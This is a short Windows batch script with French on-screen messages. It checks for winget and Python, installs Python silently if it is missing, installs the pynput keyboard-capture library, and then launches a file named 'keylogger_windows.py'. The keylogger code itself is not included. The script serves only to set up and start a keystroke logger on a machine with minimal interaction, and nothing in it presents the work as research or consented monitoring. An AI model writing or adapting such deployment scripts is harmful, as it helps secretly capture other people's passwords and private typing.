@echo off
title INSTALLATION AUTO (NOUVEAU SCRIPT)
color 0B

echo.
echo =====================================================
echo   CECI EST LE NOUVEAU SCRIPT D'INSTALLATION
echo =====================================================
echo.

:: 1. Test de Winget (l'outil d'installation)
winget --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [INFO] Winget n'est pas detecte.
    echo [ACTION] Nous allons ouvrir la page de telechargement Python.
    echo Veuillez telecharger et installer Python manuellement.
    echo IMPORTANT : COCHEZ "ADD TO PATH" !
    start https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe
    pause
    exit
)

:: 2. Vérification Python
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ALERTE] Python n'est pas la.
    echo [ACTION] Installation automatique en cours...
    echo Ne touchez a rien, cela peut prendre 2 minutes...
    
    :: Installation silencieuse
    winget install -e --id Python.Python.3.11 --scope machine --accept-package-agreements --accept-source-agreements
    
    echo.
    echo [INFO] Verification apres installation...
    python --version
)

:: 3. Installation des dépendances
echo.
echo [ETAPE 2] Installation de pynput...
pip install pynput

:: 4. Lancement
echo.
echo [ETAPE 3] Lancement du Keylogger...
python keylogger_windows.py

pause
